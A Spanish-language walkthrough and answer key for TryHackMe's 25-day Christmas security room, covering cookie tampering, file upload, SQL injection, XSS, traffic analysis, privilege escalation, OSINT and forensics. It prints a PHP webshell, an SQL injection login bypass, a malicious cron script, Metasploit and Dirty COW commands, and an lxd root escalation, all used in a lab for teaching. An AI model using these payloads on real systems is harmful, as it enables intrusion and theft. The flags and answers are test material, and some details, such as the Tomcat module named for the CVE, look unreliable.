# 25 Days of Cyber Security

| **Dificultad** | Easy |
| **Tipo** | CTF derivado del contenido |
| **Slug** | `learncyberin25days` |
| **Link** | [TryHackMe](https://tryhackme.com/room/learncyberin25days) |
| **Sección** | 01 Level Easy |
| **Fuente** | TryHackMe |
| **Componentes** | CyberChef / wfuzz / gobuster / sqlmap / ZAP / Wireshark / Nmap / enum4linux / smbclient / Metasploit / Ghidra |
| **Impacto** | Recorrido navideño de 25 días por web, redes, OSINT, forense y explotación para iniciarse en ciberseguridad. |

---

**Contexto:** Reto navideño de TryHackMe con 25 tareas diarias que llevan a McSkidy y su equipo a recuperar el control del trineo de Santa. Mezcla explotación web (cookies, subida de archivos, fuzzing, SQLi, XSS), análisis de tráfico, servicios de red (FTP/SMB), escalada de privilegios (sudo, Dirty COW), OSINT, scripting en Python, ingeniería inversa y forense en Windows, cerrando con una máquina estilo TRON (web + contenedores/lxd).

## Solucionario

### Task 1: Introducción

**Explicación:** La sala arranca explicando el formato del evento: durante 25 días se publican tareas diarias que combinan un vídeo y material teórico con una máquina o desafío práctico. Aquí solo hay que leer la introducción y prepararse para desplegar máquinas; es una tarea de lectura sin respuestas.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Deploy de la máquina y lectura de la introducción. | `No answer needed` |

### Task 2: Preparación del entorno

**Explicación:** Antes de empezar conviene decidir cómo conectarse al laboratorio: mediante la AttackBox (el entorno remoto de Kali de TryHackMe) o con la VPN de OpenVPN usando una máquina propia. Se recomienda instalar y comprobar que herramientas como Nmap, GoBuster, Wireshark o Burp Suite funcionan. Tarea de configuración sin respuestas.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Configura la máquina y el AttackBox para comenzar. | `No answer needed` |

### Task 3: Día 1 - Autenticación (cookies)

**Explicación:** Primer día práctico: la aplicación del "Best Festival Company" guarda el estado de autenticación en una cookie llamada `auth`. El valor está codificado en hexadecimal y, al decodificarlo, se obtiene un objeto JSON con campos como `company` y `username`. Con CyberChef (o cualquier conversor hex→ASCII) se ve la cookie de Santa:

```json
7b22636f6d70616e79223a22546865204265737420466573746976616c20436f6d70616e79222c2022757365726e616d65223a2273616e7461227d
Hex → ASCII → {"company":"The Best Festival Company", "username":"santa"}
```

Modificar el valor `username` a `santa` y recargar deja la "línea de la fábrica" totalmente activa, mostrando la flag. La lección es que todo secreto "ofuscado" con una codificación reversible (hex/base64/JSON) puede leerse y manipularse.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Accede al portal y autentícate para generar tu cookie. | `No answer needed` |
| 2 | ¿Cuál es el nombre de la cookie usada para la autenticación? | `auth` |
| 3 | ¿En qué formato está codificado el valor de la cookie? | `Hexadecimal` |
| 4 | Tras decodificar la cookie, ¿en qué formato se almacenan los datos? | `JSON` |
| 5 | ¿Cuál es el valor de la cookie de Santa? | `7b22636f6d70616e79223a22546865204265737420466573746976616c20436f6d70616e79222c2022757365726e616d65223a2273616e7461227d` |
| 6 | ¿Qué flag se obtiene cuando la línea está totalmente activa? | `THM{MjY0Yzg5NTJmY2Q1NzM1NjBmZWFhYmQy}` |

### Task 4: Día 2 - Subida de archivos

**Explicación:** El objetivo permite subir archivos. Añadir a la URL la cadena `?id=ODIzODI5MTNiYmYw` (otro valor codificado en base64) abre la página de subida. El sitio solo acepta imágenes de forma aparente, pero la validación de tipo de archivo es débil (solo contentType o extensión), de modo que se puede subir un archivo PHP disfrazado que permita ejecutar comandos. Los archivos se guardan en `/uploads/`. Un webshell típico sería:

```php
<?php system($_GET['cmd']); ?>
```

Al subirlo como `shell.php` y visitar `http://MACHINE_IP/uploads/shell.php?cmd=cat+/var/www/flag.txt` se ejecuta el comando y se recupera la flag del servidor.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Qué cadena de texto hay que añadir a la URL para acceder a la página de subida? | `?id=ODIzODI5MTNiYmYw` |
| 2 | ¿Qué tipo de archivo acepta el sitio? | `Image` |
| 3 | ¿En qué directorio se almacenan los archivos subidos? | `/uploads/` |
| 4 | Explota la subida de archivos para ejecutar código. | `No answer needed` |
| 5 | ¿Cuál es la flag en /var/www/flag.txt? | `THM{MGU3Y2UyMGUwNjExYTY4NTAxOWJhMzhh}` |

### Task 5: Día 3 - Descubriendo credenciales

**Explicación:** Día dedicado al ataque de autenticación: el reto plantea interceptar o descubrir las credenciales que viajan en la aplicación (por ejemplo, capturando el tráfico del login o leyendo el código que envía la petición). Tras completar el laboratorio guiado, la flag aparece al obtener acceso. Es una tarea de paso guiado: "No answer needed" para el ataque en sí y la flag al final.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Realiza el ataque de autenticación indicado en el laboratorio. | `No answer needed` |
| 2 | ¿Cuál es la flag? | `THM{885ffab980e049847516f9d8fe99ad1a}` |

### Task 6: Día 4 - Enumeración web y fuzzing

**Explicación:** Se enseña a descubrir contenido y parámetros con fuzzing. La teoría explica wfuzz (`-c` color, `-z file,wordlist` carga la lista y `FUZZ` marca dónde inyectar) y GoBuster para directorios. Contra la máquina desplegada, GoBuster revela el directorio de la API, que contiene `site-log.php`. Al fuzzear el parámetro `date` de ese archivo, el post correcto devuelve la flag:

```bash
# Enumeración de directorios con GoBuster
gobuster dir -u http://MACHINE_IP -w /usr/share/wordlists/dirb/common.txt

# Fuzzing del parámetro "date" de site-log.php
wfuzz -c -z file,/usr/share/wordlists/dirb/big.txt http://MACHINE_IP/api/site-log.php?date=FUZZ
```

Ejemplo del enunciado (objetivo ficticio shibes.xyz): `wfuzz -c -z file,big.txt http://shibes.xyz/api.php?breed=FUZZ`.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Ejecuta la enumeración de directorios contra el objetivo desplegado. | `No answer needed` |
| 2 | Dada la URL "http://shibes.xyz/api.php", ¿cuál sería el comando wfuzz completo para consultar el parámetro "breed" con la wordlist "big.txt"? | `wfuzz -c -z file,big.txt http://shibes.xyz/api.php?breed=FUZZ` |
| 3 | Usando GoBuster (contra el objetivo desplegado, no shibes.xyz) para encontrar el directorio de la API, ¿qué archivo hay? | `site-log.php` |
| 4 | Fuzzea el parámetro "date" del archivo encontrado en el directorio de la API. ¿Qué flag muestra el post correcto? | `THM{D4t3_AP1}` |

### Task 7: Día 5 - Inyección SQL en el panel de Santa

**Explicación:** Sin fuzzear directorios (pista: revisar el código fuente o robots.txt), se localiza el panel secreto de Santa en `/santapanel`. El formulario de login es vulnerable a inyección SQL: basta inyectar en el campo de usuario un payload clásico de bypass para que la consulta devuelva filas sin conocer la contraseña:

```sql
' OR 1=1 -- -
```

Una vez dentro, la aplicación lista la base de datos de regalos (22 entradas). Enumerando columnas y filas se obtiene el regalo de Paul (`Github Ownership`), la flag `thmfox{All_I_Want_for_Christmas_Is_You}` y la contraseña de admin (`EhCNSWzzFP6sc7gB`), probablemente desde una tabla de usuarios. Lección: las consultas concatenadas con entrada del usuario permiten modificar la lógica SQL.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Sin usar fuerza bruta de directorios, ¿cuál es el panel de login secreto de Santa? | `/santapanel` |
| 2 | Bypassea el login con inyección SQL. | `No answer needed` |
| 3 | ¿Cuántas entradas hay en la base de datos de regalos? | `22` |
| 4 | ¿Qué pidió Paul? | `Github Ownership` |
| 5 | ¿Cuál es la flag? | `thmfox{All_I_Want_for_Christmas_Is_You}` |
| 6 | ¿Cuál es la contraseña de admin? | `EhCNSWzzFP6sc7gB` |

### Task 8: Día 6 - Cross-Site Scripting (XSS)

**Explicación:** El foro de la aplicación permite publicar mensajes que se renderizan sin sanear, permitiendo XSS almacenado (stored XSS) al inyectar `<script>` que se ejecuta cuando otro usuario visita la página. La cadena de búsqueda `q` también se refleja sin escapar y permite XSS reflejado. El laboratorio propone usar OWASP ZAP (`zaproxy`):

```bash
# Lanzar ZAP
zaproxy
# Escaneo automatizado: la comprobación de XSS reflejado reporta las alertas
```

El escaneo automatizado detecta 2 alertas XSS. Después se continúa manualmente con la explotación (por ejemplo, capturar cookies o confirmar la ejecución en el navegador objetivo). Los ejercicios son de paso guiado.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Explora el foro y localiza el fallo de inyección. | `No answer needed` |
| 2 | ¿Qué tipo de vulnerabilidad se usó para explotar la aplicación? | `Stored cross-site scripting` |
| 3 | ¿Qué cadena de consulta puede abusarse para crear un XSS reflejado? | `q` |
| 4 | Prepara ZAP (zaproxy) contra el objetivo. | `No answer needed` |
| 5 | Ejecuta un escaneo automatizado de ZAP. ¿Cuántas alertas XSS hay? | `2` |
| 6 | Continúa con la explotación del XSS. | `No answer needed` |

### Task 9: Día 7 - Análisis de tráfico (Wireshark)

**Explicación:** Práctica de análisis de capturas PCAP con Wireshark. En `pcap1.pcap`, el primer paquete ICMP (ping) parte de `10.11.3.2`. Para aislar peticiones web se usa el filtro de pantalla:

```text
http.request.method == GET
```

Con ese filtro se ve que la IP `10.10.67.199` visitó el artículo `reindeer-of-the-week`. En `pcap2.pcap` se sigue el flujo FTP (Follow TCP Stream) y aparece la contraseña `plaintext_password_fiasco` enviada en claro durante el login; el resto de la sesión usa SSH, que sí está cifrado. La pregunta final es de cultura de la historia (lo que Elf McSkidy quiere para sustituir a Elf McEager: un `Rubber ducky`).

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Abre "pcap1.pcap" en Wireshark. ¿Qué dirección IP inicia el ping/ICMP? | `10.11.3.2` |
| 2 | ¿Qué filtro usarías para ver solo peticiones HTTP GET en "pcap1.pcap"? | `http.request.method == GET` |
| 3 | Aplica este filtro. ¿Cómo se llama el artículo que visitó la IP "10.10.67.199"? | `reindeer-of-the-week` |
| 4 | Analiza "pcap2.pcap". ¿Qué contraseña se filtró durante el login FTP? | `plaintext_password_fiasco` |
| 5 | Continuando con "pcap2.pcap", ¿qué protocolo está cifrado? | `SSH` |
| 6 | ¿Qué quiere Elf McSkidy para sustituir a Elf McEager? | `Rubber ducky` |

### Task 10: Día 8 - Snort y Nmap

**Explicación:** Repaso de dos herramientas: Snort (IDS/IPS creado en 1998 por Martin Roesch) y Nmap. Contra la máquina, Nmap revela tres servicios: puertos 80 (HTTP), 2222 (SSH) y 3389 (RDP). Con detección de SO (`-O`) reporta Ubuntu como distribución más probable, y con el script NSE `http-title` se ve el título de la web, que indica que es un blog:

```bash
nmap -sV -O MACHINE_IP
nmap --script http-title MACHINE_IP
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cuándo fue creado Snort? | `1998` |
| 2 | Usando Nmap sobre MACHINE_IP, ¿cuáles son los puertos de los tres servicios en ejecución? (en orden ascendente, separados por coma) | `80,2222,3389` |
| 3 | Despliega el objetivo y arranca el escaneo inicial. | `No answer needed` |
| 4 | Comprueba los resultados del escaneo de puertos. | `No answer needed` |
| 5 | Con Nmap, ¿qué distribución de Linux se reporta como la más probable? | `Ubuntu` |
| 6 | Usa el NSE de Nmap para obtener el "HTTP-TITLE". ¿Para qué crees que se usa la web? | `Blog` |
| 7 | Continúa con el análisis del objetivo. | `No answer needed` |

### Task 11: Día 9 - FTP anónimo

**Explicación:** El servidor FTP permite el acceso anónimo (usuario `anonymous` sin contraseña). Al conectarse y listar, se encuentra el directorio `public` con el script `backup.sh`, un script que probablemente se ejecuta por cron. También hay una lista de compras de Santa con `The Polar Express`. La explotación consiste en sobrescribir `backup.sh` con un payload que ejecute comandos cuando el cron lo lance:

```bash
ftp MACHINE_IP
# login: anonymous
cd public
put backup.sh        # versión maliciosa
# contenido malicioso de backup.sh
#!/bin/bash
cat /root/flag.txt > /home/ftpuser/public/flag.txt
```

Al ejecutarse el cron, el script devuelve el contenido de `/root/flag.txt` (`THM{even_you_can_be_santa}`). Lección: los servicios FTP "abiertos" combinados con tareas programadas dan escalada.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cómo se llama el directorio del servidor FTP con datos accesibles por el usuario "anonymous"? | `public` |
| 2 | ¿Qué script se ejecuta dentro de este directorio? | `backup.sh` |
| 3 | ¿Qué película tenía Santa en su lista de compras de Navidad? | `The Polar Express` |
| 4 | Re-subida el script con datos maliciosos (como en la sección 9.6) y muestra el contenido de /root/flag.txt. | `THM{even_you_can_be_santa}` |

### Task 12: Día 10 - Samba

**Explicación:** Enumeración de un servidor Samba con enum4linux. El escaneo completo (`enum4linux -a`) descubre 3 usuarios y 4 shares. Con smbclient se prueban los shares sin credenciales y uno, `tbfc-santa`, permite entrada anónima:

```bash
enum4linux -a MACHINE_IP
smbclient //MACHINE_IP/tbfc-santa
# Enter password: (enter)
ls
```

Dentro del share se encuentra el directorio `jingle-tunes` que ElfMcSkidy dejó para Santa. Lección: los shares SMB mal configurados (sin contraseña o con permisos por defecto) exponen información.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Usando enum4linux, ¿cuántos usuarios hay en el servidor Samba (MACHINE_IP)? | `3` |
| 2 | ¿Cuántos "shares" hay en el servidor Samba? | `4` |
| 3 | Usa smbclient para intentar entrar en los shares. ¿Qué share no requiere contraseña? | `tbfc-santa` |
| 4 | Entra en ese share. ¿Qué directorio dejó ElfMcSkidy para Santa? | `jingle-tunes` |

### Task 13: Día 11 - Escalada de privilegios (sudo)

**Explicación:** Introducción a la escalada vertical: usar privilegios de administrador desde un usuario normal. El archivo `/etc/sudoers` guarda qué usuarios/grupos pueden ejecutar qué comandos con sudo. Con el usuario comprometido del laboratorio:

```bash
sudo -l
# Permite ejecutar un comando como root
sudo <comando>
cat /root/flag.txt
```

La flag raíz es `thm{2fb10afe933296592}`. Lección: comprobar siempre los privilegios sudo concedidos, el clásico vector de escalada.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Qué tipo de escalada de privilegios usa una cuenta de usuario para ejecutar comandos como administrador? | `Vertical` |
| 2 | ¿Cómo se llama el archivo que contiene la lista de usuarios del grupo sudo? | `sudoers` |
| 3 | Comprueba los privilegios sudo del usuario comprometido. | `No answer needed` |
| 4 | Escala privilegios para acceder a root. | `No answer needed` |
| 5 | ¿Cuál es el contenido del archivo /root/flag.txt? | `thm{2fb10afe933296592}` |

### Task 14: Día 12 - Apache Tomcat (Metasploit)

**Explicación:** Explotación de Apache Tomcat 9.0.17. La vulnerabilidad CVE-2019-0232 está en el CGI Servlet y permite la ejecución de comandos, lo que con Metasploit se convierte en una sesión Meterpreter:

```bash
msfconsole
use exploit/multi/http/tomcat_jsp_upload_bypass   # o el módulo del CVE-2019-0232
set RHOSTS MACHINE_IP
set LHOST tun0
run
```

Tras ganar la sesión se lee `flag1.txt` (`thm{whacking_all_the_elves}`) y se escala hasta root para completar la tarea. Lección: identificar versiones exactas de middleware y buscar su CVE.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cuál es el número de versión del servidor web? | `9.0.17` |
| 2 | ¿Qué CVE puede usarse para crear una entrada Meterpreter en la máquina? (Formato: CVE-XXXX-XXXX) | `CVE-2019-0232` |
| 3 | Explota la máquina con Metasploit. | `No answer needed` |
| 4 | ¿Cuál es el contenido de flag1.txt? | `thm{whacking_all_the_elves}` |
| 5 | Escala a root y completa el reto. | `No answer needed` |

### Task 15: Día 13 - Escalada de privilegios (Dirty COW)

**Explicación:** Máquina antigua (Ubuntu 12.04) que expone `telnet` (protocolo obsoleto y en claro). Con las credenciales dejadas (`clauschristmas`) se entra por telnet y se comprueba el kernel, vulnerable a Dirty COW (CVE-2016-5195), una carrera en el copy-on-write del kernel que permite sobreescribir ficheros root. Se compila el exploit clásico:

```bash
# Sintaxis literal de los comentarios del código fuente
gcc -pthread dirty.c -o dirty -lcrypt
./dirty
```

La versión por defecto crea el usuario `firefart` con contraseña elegida. La salida del exploit termina mostrando un hash MD5 (`8b16f00dd3b51efadb02c1df7f8427cc`) que hay que registrar. Lección: kernels antiguos sin parchear y servicios heredados son un riesgo crítico.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Despliega la máquina vulnerable. | `No answer needed` |
| 2 | Enumera los servicios expuestos. | `No answer needed` |
| 3 | ¿Qué protocolo/servicio antiguo y obsoleto está en ejecución? | `telnet` |
| 4 | ¿Qué credencial se te dejó? | `clauschristmas` |
| 5 | ¿Qué distribución de Linux y versión ejecuta el servidor? | `Ubuntu 12.04` |
| 6 | ¿Quién llegó primero? | `grinch` |
| 7 | Conéctate con las credenciales y comprueba el kernel. | `No answer needed` |
| 8 | ¿Cuál es la sintaxis literal para compilar, tomada de los comentarios del código fuente C real? | `gcc -pthread dirty.c -o dirty -lcrypt` |
| 9 | ¿Qué "nuevo" usuario crea la versión por defecto del código fuente C real? | `firefart` |
| 10 | Ejecuta el exploit y obtén una shell de root. | `No answer needed` |
| 11 | ¿Cuál es el hash MD5 de salida? | `8b16f00dd3b51efadb02c1df7f8427cc` |

### Task 16: Día 14 - OSINT (Ho-Ho-Hosint)

**Explicación:** Investigación OSINT sobre Rudolph, usuario de Reddit `IGuidetheClaus2020`. Su historial público de comentarios está en `reddit.com/user/IGuidetheClaus2020/comments`. De sus posts se deduce: nació en Chicago, menciona a Robert May (autor de la historia de Rudolph), usa Twitter con el mismo handle `IGuideClaus2020`, sigue el programa `Bachelorette`, participó en el desfile de Chicago, y las fotos tienen EXIF con coordenadas `41.891815, -87.624277`. Las fotos EXIF también ocultan la flag `{FLAG}ALWAYSCHECKTHEEXIFD4T4`. En haveibeenpwned su correo/reveal da la contraseña `spygame` de una brecha. Cruzando todo, se ubica en el hotel de Magnificent Mile número `540`. Técnicas: OSINT en redes sociales, metadatos EXIF, búsquedas de credenciales filtradas y geolocalización.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Qué URL te lleva directamente al historial de comentarios de Reddit de Rudolph? | `https://www.reddit.com/user/IGuidetheClaus2020/comments` |
| 2 | Según Rudolph, ¿dónde nació? | `Chicago` |
| 3 | Rudolph menciona a Robert. ¿Puedes decir su apellido con Google? | `May` |
| 4 | ¿En qué otra plataforma de redes sociales podría tener cuenta Rudolph? | `Twitter` |
| 5 | ¿Cuál es el nombre de usuario de Rudolph en esa plataforma? | `IGuideClaus2020` |
| 6 | ¿Cuál parece ser su programa de TV favorito ahora mismo? | `Bachelorette` |
| 7 | Por su historial de posts, participó en un desfile. ¿Dónde tuvo lugar? | `Chicago` |
| 8 | Encontraste la ciudad, pero ¿dónde exactamente se tomó una de las fotos? | `41.891815, -87.624277` |
| 9 | ¿Encontraste también una flag? | `{FLAG}ALWAYSCHECKTHEEXIFD4T4` |
| 10 | ¿Ha sido "pwned" Rudolph? ¿Qué contraseña suya apareció en una brecha? | `spygame` |
| 11 | Por todo lo recopilado, Rudolph está en la Windy City en un hotel de Magnificent Mile. ¿Cuál es el número de la dirección del hotel? | `540` |

### Task 17: Día 15 - Python

**Explicación:** Mini-lección de Python: `True + True` suma los booleanos como 1+1 → `2`. `bool("False")` es `True` porque la cadena no vacía se evalúa como verdadera. PyPI (`pip install`) es el índice de paquetes de terceros y `requests` la librería estándar de facto para descargar HTML. El código de la pregunta 5 (funciones que modifican una lista global) devuelve `[1, 2, 3, 6]` porque las listas se pasan por referencia: la función modifica el objeto original, incluso si se declara una variable global o se muta dentro de otra función.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cuál es la salida de True + True? | `2` |
| 2 | ¿Cómo se llama la base de datos para instalar librerías de otros desarrolladores? | `PyPi` |
| 3 | ¿Cuál es la salida de bool("False")? | `True` |
| 4 | ¿Qué librería permite descargar el HTML de una página web? | `Requests` |
| 5 | ¿Cuál es la salida del programa del "Código a analizar para la pregunta 5"? | `[1, 2, 3, 6]` |
| 6 | ¿Qué causa la salida anterior? | `Pass by reference` |

### Task 18: Día 16 - API del trineo de Santa

**Explicación:** Mediante inspección de la web (sin herramientas de fuzzing) se localiza la API en `/api/` sobre el puerto 80. Consultando los endpoints se ve la posición de Santa ("Winter Wonderland, Hyde Park, London"). El reto requiere adivinar la API key: un número impar entre 0 y 100, probando con `curl`; demasiados intentos bloquean el trineo, así que hay que ser metódico. La key correcta es `57`:

```bash
curl "http://MACHINE_IP/api/findlocation.php?apikey=57"
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cuál es el número de puerto del servidor web? | `80` |
| 2 | Sin herramientas de enumeración como Dirbuster, ¿cuál es el directorio de la API? (sin la API key) | `/api/` |
| 3 | ¿Dónde está Santa ahora mismo? | `Winter Wonderland, Hyde Park, London` |
| 4 | Encuentra la API key correcta. Recuerda: es un número impar entre 0 y 100 y, tras demasiados intentos, el trineo de Santa te bloqueará. | `57` |

### Task 19: Día 17 - Ingeniería inversa (Ghidra)

**Explicación:** Práctica de ingeniería inversa con Ghidra sobre un binario pequeño. Se sigue el código descompilado: la variable `local_ch` recibe `1` en la primera instrucción `movl`; después `eax` se multiplica por 6 en la instrucción `imull` (resultado `6`); y `local_4h` guarda `6` antes de que `eax` se ponga a 0. Se trata de leer el flujo de las instrucciones de ensamblado (mov, imul, mov y xor de limpieza) para deducir los valores intermedios.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cuál es el valor de local_ch cuando se llama a la instrucción movl correspondiente (la primera si hay varias)? | `1` |
| 2 | ¿Cuál es el valor de eax cuando se llama a la instrucción imull? | `6` |
| 3 | ¿Cuál es el valor de local_4h antes de que eax se ponga a 0? | `6` |

### Task 20: Día 18 - Crackeo de contraseñas

**Explicación:** Se extrae un hash de contraseña del sistema (p. ej., de `/etc/shadow` o de archivos de la app) y se prepara para crackearlo. Con el formato identificado se usa John the Ripper o hashcat con una wordlist (rockyou). La contraseña de Santa resulta ser `santapassword321`. Al iniciar sesión con ella en la aplicación, la web muestra la flag `thm{046af}`. Lección: hashes sin salt y contraseñas débiles son triviales de recuperar.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Obtén el hash y prepáralo para crackearlo. | `No answer needed` |
| 2 | ¿Cuál es la contraseña de Santa? | `santapassword321` |
| 3 | Ahora que recuperaste la contraseña, intenta iniciar sesión... ¿Cuál es la flag? | `thm{046af}` |

### Task 21: Día 19 - Explotación web (Naughty List)

**Explicación:** En la web de la "Naughty List" el login permite probar credenciales: la contraseña de Santa es la frase `Be good for goodness sake!`. Con ese acceso, el panel muestra la flag `THM{EVERYONE_GETS_PRESENTS}`. Lección: hardcodear frases como contraseña en el front-end o en el código permite entrar a quien conozca el mecanismo.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cuál es la contraseña de Santa? | `Be good for goodness sake!` |
| 2 | ¿Cuál es la flag del reto? | `THM{EVERYONE_GETS_PRESENTS}` |

### Task 22: Día 20 - Windows Forensics (los Elfos)

**Explicación:** Forense básico en un Windows: se buscan archivos ocultos dejados por tres elfos. Con el Explorador de Windows con "mostrar ocultos" o con `dir /a` / shell, se localiza:
1. Un archivo elfo en Documents → quiere "2 front teeth".
2. Una carpeta oculta en el escritorio → quiere la película `Scrooged`.
3. Una carpeta oculta en C:\Windows llamada `3lfthr3e` con dos archivos de texto; el primero tiene 9999 palabras y las palabras en los índices 551 y 6991 son `Red Ryder`; buscando esa frase en el segundo archivo se descubre que el Elfo 3 quiere una `Red Ryder BB Gun`.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Busca el primer archivo elfo oculto dentro de la carpeta Documents. Léelo. ¿Qué quiere el Elfo 1? | `2 front teeth` |
| 2 | Busca en el escritorio una carpeta oculta con el archivo del Elfo 2. ¿Cómo se llama la película que quiere? | `Scrooged` |
| 3 | Busca en el directorio de Windows una carpeta oculta con los archivos del Elfo 3. ¿Cómo se llama la carpeta oculta? | `3lfthr3e` |
| 4 | ¿Cuántas palabras contiene el primer archivo? | `9999` |
| 5 | ¿Qué 2 palabras están en los índices 551 y 6991 del primer archivo? | `Red Ryder` |
| 6 | Esto es solo la mitad. Busca en el segundo archivo la frase de la pregunta anterior. ¿Qué quiere el Elfo 3? | `Red Ryder BB Gun` |

### Task 23: Día 21 - Windows Forensics (hashes y strings)

**Explicación:** Se analizan ejecutables sospechosos en la carpeta Documents. Primero se calculan los hashes con `Get-FileHash` o `certutil`:
- `db.exe` → `596690FFC54AB6101932856E6A78E3A1`
- el ejecutable misterioso → `5F037501FB542AD2D9B06EB12AED09F0`

Con la utilidad `strings` (o `strings64.exe`) sobre el segundo binario se extraen cadenas legibles y se localiza la flag oculta `THM{f6187e6cbeb1214139ef313e108cb6f9}`. Ejecutando el conector de base de datos (db.exe) se imprime otra flag `THM{3088731ddc7b9fdeccaed982b07c297c}`. Lección: los hashes identifican archivos y las cadenas incrustadas revelan datos útiles.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Lee el archivo de texto de la carpeta Documents. ¿Cuál es el hash del archivo db.exe? | `596690FFC54AB6101932856E6A78E3A1` |
| 2 | ¿Cuál es el hash del ejecutable misterioso en la carpeta Documents? | `5F037501FB542AD2D9B06EB12AED09F0` |
| 3 | Usando Strings, encuentra la flag oculta dentro del ejecutable. | `THM{f6187e6cbeb1214139ef313e108cb6f9}` |
| 4 | ¿Qué flag se muestra al ejecutar el conector de la base de datos? | `THM{3088731ddc7b9fdeccaed982b07c297c}` |

### Task 24: Día 22 - KeePass

**Explicación:** Análisis de una base de datos KeePass. Se abre con KeePass 2 y la contraseña `thegrinchwashere`. En las entradas, la columna password muestra valores aparentemente cifrados y el campo 'Matching ops' revela el método usado: `Base64`. Decodificando cada valor con CyberChef (From Base64) se obtienen las contraseñas reales: `sn0wM4n!` (Elf Server), `ic3Skating!` (ElfMail) y la contraseña de la última entrada que entrega la flag `THM{657012dcf3d1318dca0ed864f0e70535}`.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cuál es la contraseña de la base de datos KeePass? | `thegrinchwashere` |
| 2 | ¿Qué método de codificación aparece como 'Matching ops'? | `Base64` |
| 3 | ¿Cuál es el valor decodificado de la contraseña del Elf Server? | `sn0wM4n!` |
| 4 | ¿Cuál es el valor decodificado de la contraseña de ElfMail? | `ic3Skating!` |
| 5 | Decodifica el último valor. ¿Cuál es la flag? | `THM{657012dcf3d1318dca0ed864f0e70535}` |

### Task 25: Día 23 - Ransomware (Windows Forensics)

**Explicación:** Caso de ransomware en Windows. La nota de rescate esconde una "dirección bitcoin" falsa: decodificada (RoT13/base64) da `nomorebestfestivalcompany`. Los archivos cifrados cambian su extensión a `.grinch`. En el Programador de tareas hay una tarea sospechosa `opidsfsdf` que ejecuta `C:\users\administrator\desktop\opidsfsdf.exe` al iniciar sesión. Otra tarea elimina las copias de sombra VSS, cuyo ID de ShadowCopyVolume es `7a9eea15-0000-0000-0000-010000000000`. Al asignar una letra a la/unidad oculta aparece la carpeta `Confidential` y, usando la pestaña 'Previous Versions' (volúmenes de sombra previos), se restaura el archivo cifrado y se lee `m33pa55w0rdIZseecure!`. Lección: los VSS y la restauración de versiones son una vía forense clave contra ransomware.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Descifra la 'dirección bitcoin' falsa de la nota de rescate. ¿Cuál es el valor en texto plano? | `nomorebestfestivalcompany` |
| 2 | A veces el ransomware cambia la extensión de los archivos cifrados. ¿Cuál es la extensión de cada archivo cifrado? | `.grinch` |
| 3 | ¿Cómo se llama la tarea programada sospechosa? | `opidsfsdf` |
| 4 | Inspecciona las propiedades de la tarea. ¿Dónde está el ejecutable que se lanza al iniciar sesión? | `C:\users\administrator\desktop\opidsfsdf.exe` |
| 5 | Hay otra tarea programada relacionada con VSS. ¿Cuál es el ID de ShadowCopyVolume? | `7a9eea15-0000-0000-0000-010000000000` |
| 6 | Asigna una letra a la partición oculta. ¿Cómo se llama la carpeta oculta? | `Confidential` |
| 7 | Usa la pestaña 'Previous Versions' para restaurar el archivo cifrado. ¿Cuál es la contraseña dentro del archivo? | `m33pa55w0rdIZseecure!` |

### Task 26: Día 24 - TRON (web + Docker)

**Explicación:** Máquina final estilo Tron. El escaneo muestra puertos 80 y 65000. Enumerando recursivamente la web (incluido el puerto 65000) se encuentra el título `Light Cycle`. GoBuster revela la página oculta `uploads.php` y el directorio `grid` donde se guardan las subidas. Se sube una webshell PHP para obtener una shell web y leer `web.txt` → `THM{ENTER_THE_GRID}`. Tras pivotar, en los archivos de configuración del servidor web aparecen credenciales en la base de datos `tron`: usuario `tron` con contraseña `IFightForTheUsers`. En la BD se encuentran credenciales cifradas que, crackeadas, dan `@computer@`. Por SSH con `tron:@computer@` se lee `user.txt` → `THM{IDENTITY_DISC_RECOGNISED}`. El usuario pertenece al grupo `lxd`, lo que permite crear un contenedor con el sistema montado y leer la flag raíz:

```bash
sudo -l
# o
lxc image import alpine.tar.gz --alias alpine
lxc init alpine privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root
lxc start privesc
lxc exec privesc /bin/sh
cat /mnt/root/root/root.txt
```

Resultado: `THM{FLYNN_LIVES}`. Lección: el grupo `lxd/lxc` sin control equivale a acceso root.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Escanea la máquina. ¿Qué puertos están abiertos? | `80, 65000` |
| 2 | ¿Cuál es el título de la web oculta? (mira recursivamente todas las webs del box) | `Light Cycle` |
| 3 | ¿Cuál es el nombre de la página php oculta? | `uploads.php` |
| 4 | ¿Cuál es el nombre del directorio oculto donde se guardan las subidas? | `grid` |
| 5 | Explota la subida de archivos para obtener una shell. | `No answer needed` |
| 6 | ¿Cuál es el valor de la flag web.txt? | `THM{ENTER_THE_GRID}` |
| 7 | Encuentra y compromete el sistema destino. | `No answer needed` |
| 8 | Revisa los archivos de configuración del servidor web. ¿Qué credenciales encuentras? (usuario:contraseña) | `tron:IFightForTheUsers` |
